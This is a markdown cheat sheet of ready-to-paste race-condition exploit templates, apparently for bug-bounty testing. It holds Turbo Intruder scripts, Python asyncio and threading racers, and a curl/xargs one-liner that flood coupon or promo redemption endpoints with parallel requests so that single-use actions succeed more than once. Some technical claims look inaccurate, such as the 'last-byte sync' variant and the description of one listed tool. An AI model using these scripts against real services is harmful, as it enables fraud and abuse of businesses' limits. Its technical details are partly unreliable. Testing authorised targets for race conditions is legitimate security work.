# Race Condition PoC Templates

Ready-to-paste attack scripts. Pick the method that matches the target's HTTP version and your tooling.

---

## 1. Turbo Intruder — gated single-packet (HTTP/2, preferred)

Paste in Turbo Intruder → **Ctrl+Enter** to send. All requests fire in one packet when the gate opens.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    # Queue all requests behind a gate, then release them simultaneously
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    # Flag anything that differs from the expected single-success baseline
    if req.status != 404:
        table.add(req)
```

## 2. Turbo Intruder — last-byte sync variant (works for HTTP/1.1)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')   # all 20 fire in a single TCP packet

def handleResponse(req, interesting):
    table.add(req)
```

## 3. Burp Repeater (no code)

1. Send the target request to Repeater.
2. Duplicate the tab 20–50 times (or use one tab + "Send group").
3. Select all → **"Send group in parallel (single-packet attack)"**.
4. Read status/length column for extra successes.

---

## 4. Python asyncio + httpx (HTTP/2, no Burp needed)

```python
import asyncio
import httpx

TARGET = "https://target.com/api/v1/redeem"
HEADERS = {
    "Authorization": "Bearer YOUR_TOKEN",
    "Content-Type": "application/json",
}
PAYLOAD = {"code": "COUPON50"}

async def send_one(client, i):
    r = await client.post(TARGET, headers=HEADERS, json=PAYLOAD)
    print(f"[{i}] {r.status_code}: {r.text[:100]}")
    return r

async def race(n=25):
    # http2=True keeps everything on one multiplexed connection
    async with httpx.AsyncClient(http2=True) as client:
        tasks = [send_one(client, i) for i in range(n)]
        results = await asyncio.gather(*tasks)
    successes = [r for r in results if r.status_code == 200]
    print(f"\n[+] {len(successes)}/{n} succeeded — race confirmed if > 1!")

asyncio.run(race())
```

> Install: `pip install "httpx[http2]"`

---

## 5. Python threading (quick + dirty)

```python
import threading, requests

url = "https://TARGET/redeem"
token = "YOUR_TOKEN"

def fire():
    requests.post(url, json={"code": "PROMO123"},
                  headers={"Authorization": f"Bearer {token}"})

threads = [threading.Thread(target=fire) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

---

## 6. curl + xargs one-liner (shell)

```bash
seq 20 | xargs -P 20 -I {} curl -s -X POST https://TARGET/redeem \
  -H "Authorization: Bearer $TOKEN" -d 'code=PROMO10' &
wait
```

`-P 20` runs 20 in parallel. Crude (subject to jitter) but fine for a first probe.

---

## Detection checklist after firing

- [ ] Count successes vs. the sequential baseline (should be exactly 1).
- [ ] Check final state: balance, redemption count, resources with duplicate unique field.
- [ ] Screenshot the results table (multiple 200 OK) **and** the resulting over-limit state.
- [ ] Reproduce 3+ times; record concurrency level and gate/hold details.
- [ ] Compute impact: `$value × (successes − 1)` over-claimed.

## Tooling

- **Turbo Intruder** — Burp extension (James Kettle), gated single-packet + last-byte sync.
- **Burp Repeater** — built-in "Send group in parallel (single-packet attack)".
- **race-the-web** — standalone CLI racer.
- **smuggler** — HTTP/2 frame races.
- **wrk** — crude HTTP/1.1 concurrency flooding.
